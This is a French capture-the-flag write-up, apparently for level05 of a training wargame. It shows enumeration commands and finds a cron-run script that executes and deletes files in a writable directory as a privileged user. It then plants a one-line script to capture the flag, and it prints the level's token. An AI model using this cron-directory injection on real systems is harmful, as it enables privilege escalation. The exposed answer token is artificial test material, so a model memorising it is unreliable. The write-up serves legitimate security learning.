Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
/home/user/level05
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

Rien de ce côté. Je regarde donc comme les premiers level au niveau des fichiers :

```
$ find / -user level05 2>/dev/null
/proc/3740
/proc/3740/task
/proc/3740/task/3740
/proc/3740/task/3740/attr
...
```

Je filtre le bruit que m'apporte le dossier `/proc` avec :

```
$ find / -user level05 2>/dev/null | grep -v proc
$
```

Mais n'obtiens rien, je regarde donc du côté du `flag05` :

```
$ find / -user flag05 2> /dev/null | grep -v proc
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Je tente de `cat` les deux fichiers :

```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

$ cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

Je commente le script trouvé ci-dessous : 

```bash
#!/bin/sh

# For each file (as $i) in /opt/openarenaserver/
for i in /opt/openarenaserver/* ; do
		# With a CPU limit for 5 secondes
        (ulimit -t 5; bash -x "$i") # Execute the file $i
        rm -f "$i" # Delete the file $i
done
```

On peut donc en déduire que ce script itère sur tout les fichiers qui se trouvent dans `/opt/openarenaserver/`, les exécute avec un temps maximum alloué de 5 secondes, puis les supprimes.

Je ne peux pas le lancer manuellement :

```
$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
```

Je regarde dans le dossier `/opt/openarenaserver/` : 

```
$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Apr  1 17:01 .
drwxr-xr-x  1 root root 60 Apr  1 17:01 ..
```

Il est vide, ce qui pourrait signifier soit qu'il n'y a jamais rien eu dedans, soit que le programme a déjà été lancé. Je créé un fichier à l'intérieur de ce dossier afin de pouvoir checker si j'arrive à lancer le script d'origine.

```
$ touch /opt/openarenaserver/test
$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root    root    60 Apr  1 20:27 .
drwxr-xr-x  1 root    root    60 Apr  1 17:01 ..
-rw-rw-r--+ 1 level05 level05  0 Apr  1 20:27 test
```

J'ai les droits de créer ce fichier. Il devrait donc être supprimé si le script s'exécute. Je vais donc me pencher d'abord sur comment l'exécuter, puis, si je peux m'en servir pour obtenir le flag.

D'abord, je remarque que, tel les précédents niveaux, le script est exécuté en tant que `flag05`, ce qui signifie qu'il peut exécuter `getflag`.

```
$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

Lors de mes observations autour des permissions, j'observe que mon fichier test à disparu (~2 minutes plus tard) dans le dossier où le script exécute puis supprime :

```
$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Apr  1 20:28 .
drwxr-xr-x  1 root root 60 Apr  1 17:01 ..
```

J'en déduis qu'il est lancé automatiquement, probablement par un CRON.
Si c'est le cas, alors je ne peux pas le lancer manuellement, et n'aurais donc pas le retour `stdout` du programme.

Si je veux qu'il exécute getflag, alors il faudra qu'il le stocke dans un fichier que je peux lire.

J'écris donc le script suivant `"getflag > /tmp/flag"` et le pipe dans un fichier bash que le script du CRON va exécuter. Cela devrait stocker le résultat de `getflag` dans `/tmp/flag`.

```
$ echo "getflag > /tmp/flag" > /opt/openarenaserver/pwned.sh
```

Je n'ai pas d'information sur le CRON, une trentaine de seconde plus tard, j'obtiens :

```
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```